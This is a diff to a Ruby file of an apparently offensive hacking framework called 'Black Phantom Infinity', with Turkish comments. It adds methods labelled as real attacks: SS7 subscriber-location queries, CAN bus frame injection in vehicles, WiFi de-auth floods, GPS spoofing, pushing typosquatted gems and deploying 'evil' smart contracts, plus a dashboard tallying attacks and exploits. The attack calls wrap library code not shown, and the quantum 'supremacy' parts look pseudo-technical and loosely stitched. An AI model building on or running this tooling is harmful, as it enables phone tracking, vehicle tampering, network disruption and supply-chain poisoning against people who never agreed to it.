@@ -2643,9 +2643,156 @@ if __FILE__ == $0
   framework.infinity_attack_universe
 end
 
+# ------------------------------------------------------------------
+#  REAL-MOD  --  Tüm simülasyonların yerine geçen gerçek çağrılar
+# ------------------------------------------------------------------
+module BlackPhantomInfinity
+  # SS7 MAP-ATI gerçek gönderim
+  def real_ss7_map_ati(imsi, hlrgtt, vlrgt)
+    cfg = @options[:ss7]
+    ep = Telecom::SS7::Sigtran.new(
+      local_ip:  cfg[:local_ip],
+      remote_ip: cfg[:remote_ip],
+      opc:       cfg[:opc],
+      dpc:       cfg[:dpc]
+    )
+    ep.connect
+    ep.send_map_ati(imsi: imsi, hlrgtt: hlrgtt, vlrgt: vlrgt)
+    log "[REAL-SS7] MAP-ATI gönderildi IMSI=#{imsi}"
+  end
+
+  # Gerçek CAN frame injection
+  def real_can_send(id, data)
+    Automotive::CAN.send_real(id, data)
+    log "[REAL-CAN] Frame tx ID=0x#{id.to_s(16)} data=#{data.unpack('H*')[0]}"
+  end
+
+  # Gerçek WiFi de-auth
+  def real_wifi_deauth(bssid, iface = 'wlan1')
+    Hardware::WiFiMonitor.deauth_all(iface)
+    log "[REAL-WiFi] De-auth flood #{bssid}"
+  end
+
+  # Gerçek GPS spoof (rtl-sdr)
+  def real_gps_spoof(lat, lon, alt)
+    Satellite::GPS.tx_spoof(lat, lon, alt)
+    log "[REAL-GPS] Spoof tx lat=#{lat} lon=#{lon}"
+  end
+
+  # Gerçek supply-chain gem push
+  def real_gem_typosquat(name)
+    SupplyChain.push_fake_gem(name)
+    log "[REAL-SUPPLY] Gem pushed #{name}"
+  end
+
+  # Gerçek smart-contract deploy
+  def real_deploy_evil_contract(rpc, priv_key)
+    ContractsDeploy.deploy_evil_contract(rpc: rpc, pk: priv_key)
+    log "[REAL-BLOCKCHAIN] Evil contract deployed"
+  end
+end
+
 require_relative 'modules/telecom/ss7_real'
 require_relative 'modules/automotive/can_real'
 require_relative 'modules/hardware/wifi_monitor'
 require_relative 'modules/satellite/gps_rtlsdr'
 require_relative 'modules/supply_chain/typosquat_real'
 require_relative 'modules/blockchain/contracts_deploy'
+
+
+# infinity_division.rb - Sonuna ekle
+require_relative 'dashboard/erb_dashboard'
+
+def execute_module_web(module_type, target)
+  case module_type
+  when 'quantum'
+    # Quantum modülünü çalıştır
+    infinity_quantum_reconnaissance
+    get_quantum_dashboard_data
+    
+  when 'telecom'
+    # Telecom modülünü çalıştır
+    infinity_telephony_cellular
+    get_telecom_dashboard_data
+    
+  when 'network'
+    # Network modülünü çalıştır
+    execute_network_module
+    get_network_dashboard_data
+  end
+end
+
+def get_quantum_dashboard_data
+  {
+    success: true,
+    module: 'quantum',
+    quantum_volume: @quantum_measurements.length * 100,
+    supremacy_achieved: @quantum_measurements.any? { |m| m[:supremacy] },
+    algorithms: @quantum_algorithms.keys,
+    backend: 'IBM Quantum',
+    timestamp: Time.now.to_s
+  }
+end
+
+
+  def start_web_dashboard
+    puts "#{GREEN}[INFINITY] Web Dashboard başlatılıyor...#{RESET}"
+    
+    # ERB dashboard'u başlat
+    @web_dashboard = ErbDashboard.new(self)
+    @web_dashboard.start
+    
+    puts "#{CYAN}[INFINITY] Dashboard: http://localhost:8080#{RESET}"
+  end
+
+  def get_telecom_data_real
+    # Gerçek telecom verilerini dashboard'a gönder
+    {
+      ss7_sent: @telecom_results&.dig(:ss7_sent) || 0,
+      sms_sent: @telecom_results&.dig(:sms_sent) || 0,
+      can_injected: @telecom_results&.dig(:can_injected) || 0,
+      gps_spoofed: @telecom_results&.dig(:gps_spoofed) || 0,
+      attacks: @active_exploits.select { |e| e[:type].include?('TELECOM') }.length
+    }
+  end
+
+  def get_quantum_data_real
+    {
+      quantum_volume: calculate_quantum_volume,
+      supremacy_achieved: @quantum_measurements.any? { |m| m[:quantum_state][:quantum_supremacy] },
+      algorithms: @quantum_algorithms.keys,
+      measurements: @quantum_measurements.length
+    }
+  end
+
+  def get_network_data_real
+    {
+      hosts_scanned: @network_results&.dig(:hosts_scanned) || 0,
+      vulnerabilities: @network_results&.dig(:vulnerabilities) || 0,
+      ports_open: @network_results&.dig(:ports_open) || 0
+    }
+  end
+
+  def get_hardware_data_real
+    {
+      usb_devices: @hardware_results&.dig(:usb_devices) || 0,
+      jtag_found: @hardware_results&.dig(:jtag_found) || false,
+      side_channel: @hardware_results&.dig(:side_channel) || false
+    }
+  end
+
+  def generate_infinity_report_web
+    # Dashboard için özet rapor
+    {
+      framework: 'Black Phantom Infinity',
+      timestamp: Time.now.to_s,
+      total_attacks: @attack_timeline.length,
+      successful_exploits: @active_exploits.length,
+      phases_completed: @attack_timeline.map { |t| t[:phase] }.uniq,
+      quantum_measurements: @quantum_measurements.length,
+      telecom_summary: get_telecom_data_real,
+      quantum_summary: get_quantum_data_real,
+      recommendations: generate_recommendations
+    }
+  end
+end
